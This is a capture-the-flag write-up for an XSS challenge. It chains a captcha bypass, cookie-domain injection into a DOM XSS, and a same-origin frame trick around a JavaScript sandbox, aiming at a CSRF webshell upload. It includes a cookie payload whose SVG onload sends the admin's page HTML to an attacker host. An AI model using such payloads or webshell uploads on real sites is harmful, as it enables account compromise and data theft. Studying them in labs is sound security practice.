<h1>Complicated xss</h1>
<p>http://government.vip/</p>
<p>flag is at: http://admin.government.vip:8000</p>
<code>
//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
</code>

<h3>Step 1: solve md5 'captcha'</h3>
<p>
generate md5_dic using md5_gen.py
sort md5_dic using:
<code>sort md5_dic > md5_sort</code>
binary search in md5_search.py

<h3>Step 2: upload js on the fly</h3>
<p>Check poc.py
<code>
python poc.py   // will upload poc.js aotumatically
</code>
</p>

<h3>Step 3: Triage</h3>
<p>
xss spot1: poc.js will be executed by admin;
xss spot2: admin.government.vip:8000/login DOM-based xss, which will output cookie.username;
In order to use admin's cookie to access admin.government.vip, we need to use xss-1 to trigger xss-2
Ref: In RFC 2109, a domain without a leading dot meant that it could not be used on subdomains, and only a leading dot (.mydomain.com) would allow it to be used across subdomains.
hence we set the cookie domain as: domain=.government.vip

But.. it has sandbox which forbid most useful functions;

Let's see what admin can see on that page first:
set poc.js to be:
<code>

document.cookie="username=<svg onload=location.href='http://myip/?'+escape(document.body.innerHTML)>; path=/; domain=.government.vip";
location.href='http://admin.government.vip:8000/login';

</code>

which told us that admin can see an upload page here;
So the goal is to CSRF the admin's post file, and get the response.
</p>

<h3>Step 4: Bypass sandbox</h3>
<p>
The subdomain http://admin.government.vip:8000/ had sandbox, which delete our favorite XMLHttpRequest, however http://admin.government.vip:8000/login still have that..
and according to same origin policy, http://admin.government.vip:8000/ can access functions in http://admin.government.vip:8000/login
To make that happen, we can create our own page and load those two as frames, check test.html

Last piece is to CSRF upload webshell and get the response back, check test.js, and poc.js 
</p>
